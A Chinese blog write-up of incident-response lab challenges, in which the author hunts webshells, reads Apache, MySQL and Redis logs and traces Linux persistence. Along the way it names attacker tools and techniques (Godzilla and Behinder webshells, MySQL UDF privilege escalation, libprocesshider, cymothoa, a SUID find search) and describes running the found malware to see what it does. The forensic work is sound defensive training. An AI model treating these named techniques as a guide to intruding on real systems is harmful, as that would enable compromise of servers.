<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/7f34907dd43c478bf4b991a92418db09--7a2e--image-20240603234947461.png" alt="image-20240603234947461"></p>
<p>直接就是找到是gz.php</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/24f58c7eca7ca7fc6e83f75d013ef857--cdde--image-20240603235135992.png" alt="image-20240603235135992"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-1"><a href="#任务二-1" class="headerlink" title="任务二"></a>任务二</h4><p>黑客使用的什么工具的shell github地址的md5 flag{md5}</p>
<p>直接搜索</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-03/3178fa94b8a77dfdb2ffde23fc26ea95--8adb--image-20240603235243396.png" alt="image-20240603235243396"></p>
<p>发现是哥斯拉</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;39392de3218c333f794befef07ac9257&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-1"><a href="#任务三-1" class="headerlink" title="任务三"></a>任务三</h4><p>黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</p>
<p>还是上面d盾也显示出来了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;aebac0e58cd6c5fad1695ee4d1ac1919&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-1"><a href="#任务四-1" class="headerlink" title="任务四"></a>任务四</h4><p>4.黑客免杀马完整路径 md5 flag{md5}</p>
<p>还是一样的，之前都直接d盾扫出来了的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;eeff2eabfd9b7a6d26fc1a53d3f7d1de&#125;</span><br></pre></td></tr></table></figure>

<p>最后这总结一下，D盾真是好好用！！！！！！！！！！！！！！！！！</p>
<p>这里记录一下一些常见的webshell查杀工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1。阿里伏魔</span><br><span class="line">https://ti.aliyun.com/#/webshell</span><br><span class="line">2、百度 WEBDIR+</span><br><span class="line">https://scanner.baidu.com/#/pages/intro</span><br><span class="line">3、河马</span><br><span class="line">https://n.shellpub.com/</span><br><span class="line">4、CloudWalker(牧云)</span><br><span class="line">https://stack.chaitin.com/security-challenge/webshell</span><br><span class="line">5、在线 webshell 查杀-灭绝师太版</span><br><span class="line">http://tools.bugscaner.com/killwebshell/</span><br><span class="line">6、WebShell Detector WebShell 扫描检测器</span><br><span class="line">http://www.shelldetector.com/</span><br><span class="line">7、D 盾</span><br><span class="line">http://www.d99net.net</span><br><span class="line">8、微步</span><br><span class="line">https://threatbook.cn/next/product/sandbox</span><br></pre></td></tr></table></figure>

<h2 id="Linux入侵排查"><a href="#Linux入侵排查" class="headerlink" title="Linux入侵排查"></a>Linux入侵排查</h2><h4 id="任务一-2"><a href="#任务一-2" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.web目录存在木马，请找到木马的密码提交</span><br></pre></td></tr></table></figure>

<p>直接就是丢d盾里去就是</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/756f0698f82fc286b735a6cd1d541f56--e870--image-20240604143457279.png" alt="image-20240604143457279"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;1&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-2"><a href="#任务二-2" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">服务器疑似存在不死马，请找到不死马的密码提交</span><br></pre></td></tr></table></figure>

<p>直接就是.shell.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hello&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-2"><a href="#任务三-2" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">不死马是通过哪个文件生成的，请提交文件名</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/575e977540b418a47bd0f108845a391f--3128--image-20240604143824876.png" alt="image-20240604143824876"></p>
<p>很明显就能找到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;index.php&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-2"><a href="#任务四-2" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客留下了木马文件，请找出黑客的服务器ip提交</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;10.11.55.21&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务五-1"><a href="#任务五-1" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客留下了木马文件，请找出黑客服务器开启的监端口提交</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;3333&#125;</span><br></pre></td></tr></table></figure>

<p>这里直接两个一起做就行，我们发现在网页目录下有个shell.elf木马文件，我们可以直接去运行它，然后再去查看netstat即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -antlp</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令详解：</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/46b380015231d41b240008156e3e0547--bbc4--image-20240604165924985.png" alt="image-20240604165924985"></p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/c030043dac3b057b133fd28fb55889e4--7864--image-20240604144504373.png" alt="image-20240604144504373"></p>
<h1 id="第二章-日志分析"><a href="#第二章-日志分析" class="headerlink" title="第二章-日志分析"></a>第二章-日志分析</h1><h2 id="apache日志分析"><a href="#apache日志分析" class="headerlink" title="apache日志分析"></a>apache日志分析</h2><h4 id="任务一-3"><a href="#任务一-3" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、提交当天访问次数最多的IP，即黑客IP：</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log access.log.1 | grep -a &quot;03/Aug&quot; | awk &#x27;&#123;print $1&#125;&#x27; | uniq -c | sort -nr</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/84d28fd8c5a98ca0d89ec8784038dd6e--38ff--image-20240604150902123.png" alt="image-20240604150902123"></p>
<p>直接找就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.200.2&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-3"><a href="#任务二-3" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客使用的浏览器指纹是什么，提交指纹的md5：</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/fcad17feb5fa9f587876e73751cf967b--3ce9--image-20240604151216742.png" alt="image-20240604151216742"></p>
<p>发现浏览器指纹就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2d6330f380f44ac20f3a02eed0958f66&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-3"><a href="#任务三-3" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log access.log.1 | grep -a &quot;/index.php&quot; | awk &#x27;&#123;print $1&#125;&#x27; |uniq -c</span><br></pre></td></tr></table></figure>

<p>就是27次</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;27&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-3"><a href="#任务四-3" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看黑客IP访问了多少次，提交次数：</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log access.log.1 | grep -a &quot;192.168.200.2 - -&quot; |awk &#x27;&#123;print $1&#125;&#x27;|uniq -c</span><br></pre></td></tr></table></figure>

<p>直接抓ip就行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;6555&#125;</span><br></pre></td></tr></table></figure>

<p>任务五</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看2023年8月03日8时这一个小时内有多少IP访问，提交次数:</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat access.log access.log.1 | grep -a &quot;03/Aug/2023:08:&quot; |awk &#x27;&#123;print $1&#125;&#x27;|sort | uniq -c</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/412f4b8562c37d19218dfc4c0c839e92--9f50--image-20240604152206000.png" alt="image-20240604152206000"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;5&#125;     5个ip</span><br></pre></td></tr></table></figure>

<h2 id="mysql应急响应"><a href="#mysql应急响应" class="headerlink" title="mysql应急响应"></a>mysql应急响应</h2><h4 id="任务一-4"><a href="#任务一-4" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.黑客第一次写入的shell flag&#123;关键字符串&#125; </span><br></pre></td></tr></table></figure>

<p>直接就是d盾扫描即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/c9e4ca70d5f748e2e078c2f37a43ff69--eec0--image-20240604162746569.png" alt="image-20240604162746569"></p>
<p>然后就找到了，在sh.php中</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/0a2bcff864b56870d0d10744161376f9--3b8c--image-20240604162812922.png" alt="image-20240604162812922"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;ccfda79e-7aa1-4275-bc26-a6189eb9a20b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-4"><a href="#任务二-4" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2.黑客反弹shell的ip flag&#123;ip&#125;</span><br></pre></td></tr></table></figure>

<p>直接去查看mysql的日志去分析   &#x2F;var&#x2F;log&#x2F;mysql&#x2F;</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/5c0faa16d71af08b1b7075b0f32cd94d--f10c--image-20240604163143457.png" alt="image-20240604163143457"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-4"><a href="#任务三-4" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3.黑客提权文件的完整路径 md5 flag&#123;md5&#125; 注 /xxx/xxx/xxx/xxx/xxx.xx</span><br></pre></td></tr></table></figure>

<p>还是之前的mysql日志，我们发现有一个敏感文件1.sh</p>
<p>我们尝试去找一下</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/302186179a7c28099e8e27a12fb462f0--cbc5--image-20240604163448110.png" alt="image-20240604163448110"></p>
<p>发现有两个，这一个就是反弹shell的</p>
<p>——到这里好像啥都没用</p>
<p>这里就应该去想一下我们应该是怎么攻击的，发现在 &#x2F;var&#x2F;www&#x2F;html 目录下存在一个 common.php 文件，那么黑客应该是通过对网站进行目录探测的时候发现了此文件，恰好此文件还泄露了数据库的账号和密码，那么他的常规操作肯定是远程连接上了数据库后再从数据库作为切入点进行提权，mysql 的常见提权方式就是 UDF 提权<br>然后再根据UDF提权的特性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UDF 提权肯定会在 /usr/lib/mysql/plugin/ 路径下留下攻击痕迹</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/2f4d33594702d01d1229dbae670548ef--2e6b--image-20240604163947174.png" alt="image-20240604163947174"></p>
<p>成功知道路径</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/lib/mysql/plugin/udf.so</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;b1818bde4e310f3d23f1005185b973e7&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-4"><a href="#任务四-4" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4.黑客获取的权限 flag&#123;whoami后的值&#125;</span><br></pre></td></tr></table></figure>

<p>直接查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ps -aux</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">命令详解：</span><br><span class="line">ps      查看进程状态</span><br><span class="line">-a      显示所有用户的所有进程</span><br><span class="line">-u      以一种面向用户的格式显示进程信息，包括用户 ID、CPU 使用率、内存使用率、命令名等。</span><br><span class="line">-x      让 ps 命令显示没有控制终端的进程。</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-04/b98b564106ffc9a6e9fe7ca1f03d1408--e482--image-20240604164233769.png" alt="image-20240604164233769"></p>
<p>可以看到是mysql权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;mysql&#125;</span><br></pre></td></tr></table></figure>

<h2 id="redis应急响应"><a href="#redis应急响应" class="headerlink" title="redis应急响应"></a>redis应急响应</h2><h4 id="任务一-5"><a href="#任务一-5" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>直接看日志，很容易就能发现一个ip多次出现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.100.13出现次数较多明显是爆破</span><br><span class="line">192.168.100.20是主从复制</span><br><span class="line">flag&#123;192.168.100.20&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-5"><a href="#任务二-5" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客第一次上传的恶意文件,将黑客上传的恶意文件里面的 FLAG 提交;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/c73a16a79b0212101d70f42dc5c69d6f--401e--image-20240605162903006.png" alt="image-20240605162903006"></p>
<p>发现对应的恶意文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./exp.so</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;XJ_78f012d7-42fc-49a8-8a8c-e74c87ea109b&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-5"><a href="#任务三-5" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客反弹 shell 的IP 为多少,将反弹 shell 的IP 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l      查看定时任务</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/5efbd4ab8dc5c4e2b077d0bc1ae5824f--b680--image-20240605163346550.png" alt="image-20240605163346550"></p>
<p>直接就能发现flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.100.13&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-5"><a href="#任务四-5" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且溯源分析黑客的用户名，并且找到黑客使用的工具里的关键字符串(flag&#123;黑客的用户-关键字符串&#125; 注关键字符串 xxx-xxx-xxx)。将用户名和关键字符串作为 FLAG提交</span><br></pre></td></tr></table></figure>

<p>ssh账号登录需要写入ssh公钥，我们直接去root下的.ssh中查看一下是否有对应文件，发现是有的</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/2cd8c6262cf5e480606f5460e207fc4b--d0aa--image-20240605163742918.png" alt="image-20240605163742918"></p>
<p>直接去读取一下，就拿到了用户名，使用用户名去github上搜索一下，就能找到flag所需的后一半</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;xj-test-user-wow-you-find-flag&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/9cb990d3bd9c94928b077bb35d247f7d--b3de--image-20240605164129010.png" alt="image-20240605164129010"></p>
<h4 id="任务五-2"><a href="#任务五-2" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC SSH到服务器并且分析黑客篡改的命令,将黑客篡改的命令里面的关键字符串作为 FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>我们直接去查看一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/bin</span><br><span class="line">ls -al</span><br></pre></td></tr></table></figure>

<p>然后我们发现ps命令被修改，直接去读取发现flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;c195i2923381905517d818e313792d196&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第三章-权限维持"><a href="#第三章-权限维持" class="headerlink" title="第三章-权限维持"></a>第三章-权限维持</h1><h2 id="linux权限维持-隐藏"><a href="#linux权限维持-隐藏" class="headerlink" title="linux权限维持-隐藏"></a>linux权限维持-隐藏</h2><h4 id="任务一-6"><a href="#任务一-6" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客隐藏的隐藏的文件 完整路径md5</span><br></pre></td></tr></table></figure>

<p>在&#x2F;tmp&#x2F;.temp&#x2F;文件夹下发现libprocesshider,libprocesshider是用于隐藏文件的项目</p>
<p>打开 &#x2F;tmp&#x2F;.temp&#x2F;libprocesshider&#x2F;processhider.c</p>
<p>成功找到隐藏的文件1.py</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/d4f38bf6929f600dcb94095637769449--089c--image-20240605175637332.png" alt="image-20240605175637332"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/.temp/libprocesshider/1.py</span><br><span class="line">flag&#123;109ccb5768c70638e24fb46ee7957e37&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-6"><a href="#任务二-6" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客隐藏的文件反弹shell的ip+端口 &#123;ip:port&#125;</span><br></pre></td></tr></table></figure>

<p>直接看1.py就行了</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/00cee077a14016b09a9897660a53672d--38e1--image-20240605175748138.png" alt="image-20240605175748138"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;114.114.114.121:9999&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-6"><a href="#任务三-6" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客提权所用的命令 完整路径的md5 flag&#123;md5&#125;</span><br></pre></td></tr></table></figure>

<p>这里去联想linux提权，也就主要是两种提权，suid和su提权</p>
<p>对比而言，suid提权更可能点，我们尝试去试试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-05/511f5ef13a54570c91357d8847df8bbd--a6bf--image-20240605180004338.png" alt="image-20240605180004338"></p>
<p>发现能够使用的find</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/find</span><br><span class="line">flag&#123;7fd5884f493f4aaf96abee286ee04120&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-6"><a href="#任务四-6" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">黑客尝试注入恶意代码的工具完整路径md5</span><br></pre></td></tr></table></figure>

<p>这里说实话有点不太理解，为什么就是opt目录下存在注入恶意代码的工具</p>
<p>cymothoa是后门工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/opt/.cymothoa-1-beta/cymothoa</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;087c267368ece4fcf422ff733b51aed9&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务五-3"><a href="#任务五-3" class="headerlink" title="任务五"></a>任务五</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">使用命令运行 ./x.xx 执行该文件 将查询的 Exec****** 值 作为flag提交 flag&#123;/xxx/xxx/xxx&#125;</span><br></pre></td></tr></table></figure>

<p>题目问1.py的启动命令的可执行程序是什么,那么就是Python3，ls &#x2F;usr&#x2F;bin&#x2F;python3 -al 看下软连接</p>
<p>再使用which去查找一下python的位置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/bin/python3.4</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;/usr/bin/python3.4&#125;</span><br></pre></td></tr></table></figure>

<h1 id="第四章-windows实战"><a href="#第四章-windows实战" class="headerlink" title="第四章-windows实战"></a>第四章-windows实战</h1><h2 id="emlog"><a href="#emlog" class="headerlink" title="emlog"></a>emlog</h2><h4 id="任务一-7"><a href="#任务一-7" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客植入 shell,将黑客植入 shell 的密码 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>可以直接使用D盾去分析一下网站根目录首先就是</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/807a96cee19d5e50097803900045fe6f--3d33--image-20240606204835088.png" alt="image-20240606204835088"></p>
<p>直接就是扫到后门</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/bd144426495ff8b9701658f09d7eb8b6--0bcd--image-20240606204904710.png" alt="image-20240606204904710"></p>
<p>发现直接就是有默认密码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;rebeyond&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-7"><a href="#任务二-7" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且分析黑客攻击成功的 IP 为多少,将黑客 IP 作为 FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>分析ip的话这里我们就可以去查看一下日志文件，因为这里的web服务器是Apache的</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/8d56435f54f735c27d9e7782c8a30be9--8999--image-20240606205424797.png" alt="image-20240606205424797"></p>
<p>拿到ip</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;192.168.126.1&#125;</span><br></pre></td></tr></table></figure>

<p>这里有一点要注意的是，就是查看日志时需要稍微修改一下后缀才能使用记事本打开</p>
<h4 id="任务三-7"><a href="#任务三-7" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且分析黑客的隐藏账户名称,将黑客隐藏账户名称作为 FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>直接使用windows日志一键分析工具即可</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/b29a949a7d04c99836299dc95c5deffd--a9f3--image-20240606210839396.png" alt="image-20240606210839396"></p>
<p>直接找到对应的敏感用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;hacker138&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2024-02-29 10:13:06	hacker138$	EC2AMAZ-2OBTHUT	10	User32 	EC2AMAZ-2OBTHUT	C:\Windows\System32\svchost.exe	36.60.53.171	0	4624</span><br></pre></td></tr></table></figure>

<h4 id="任务四-7"><a href="#任务四-7" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且分析黑客的挖矿程序的矿池域名,将黑客挖矿程序的矿池域名称作为(仅域名)FLAG 提交;</span><br></pre></td></tr></table></figure>

<p>首先就是找到对应的敏感文件</p>
<p>我们可以去查看一下这个黑客用户下的文件</p>
<p>成功发现Kuang</p>
<p>运行后发现CPU直接爆，肯定就是一个挖矿病毒了，</p>
<p>使用pyinstxtractor进行反编译得到pyc文件</p>
<p>pyc在线解密</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-06/2152705e94ea461c3edc20ab04eefa09--6ce0--image-20240606212101801.png" alt="image-20240606212101801"></p>
<p>成功获得矿池</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;wakuang.zhigongshanfang.top&#125;</span><br></pre></td></tr></table></figure>

<h2 id="向日葵"><a href="#向日葵" class="headerlink" title="向日葵"></a>向日葵</h2><h4 id="任务一-8"><a href="#任务一-8" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过本地 PC RDP到服务器并且找到黑客首次攻击成功的时间为 为多少,将黑客首次攻击成功的时间为 作为 FLAG 提交(2028-03-26 08:11:25.123);</span><br></pre></td></tr></table></figure>

<p>好难，第一个就不会写了这个</p>
<h2 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h2><h4 id="任务一-9"><a href="#任务一-9" class="headerlink" title="任务一"></a>任务一</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请提交攻击者攻击成功的第一时间，格式：flag&#123;YY:MM:DD hh:mm:ss&#125;</span><br></pre></td></tr></table></figure>

<p>直接就是看日志主要就是，这里是要看nginx的日志，不要被Apache服务给骗了，里面日志啥都没有</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/942b6ab8109194e0bb7330c939a15f50--59f2--image-20240607152705305.png" alt="image-20240607152705305"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;2023:04:29 22:45:23&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务二-8"><a href="#任务二-8" class="headerlink" title="任务二"></a>任务二</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请提交攻击者的浏览器版本 flag&#123;Firgfox/2200&#125;</span><br></pre></td></tr></table></figure>

<p>直接还是和上面一样的，这不 直接给了的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Firefox/110.0</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Firefox/110.0&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务三-8"><a href="#任务三-8" class="headerlink" title="任务三"></a>任务三</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请提交攻击者目录扫描所使用的工具名称</span><br></pre></td></tr></table></figure>

<p>这日志中直接有的</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/f83792fe3a1e3513e87f849792bce21f--1a2e--image-20240607153004452.png" alt="image-20240607153004452"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Fuzz Faster U Fool</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Fuzz Faster U Fool&#125;</span><br></pre></td></tr></table></figure>

<h4 id="任务四-8"><a href="#任务四-8" class="headerlink" title="任务四"></a>任务四</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">找到攻击者写入的恶意后门文件，提交文件名（完整路径）</span><br></pre></td></tr></table></figure>

<p>这也还是这个日志中，后边可以直接发现利用了这个后门文件的</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-06-07/9b4c2cead16ac1d70a7eb1a0f4b84296--01e2--image-20240607153145127.png" alt="image-20240607153145127"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.x.php</span><br></pre></td></tr></table></figure>

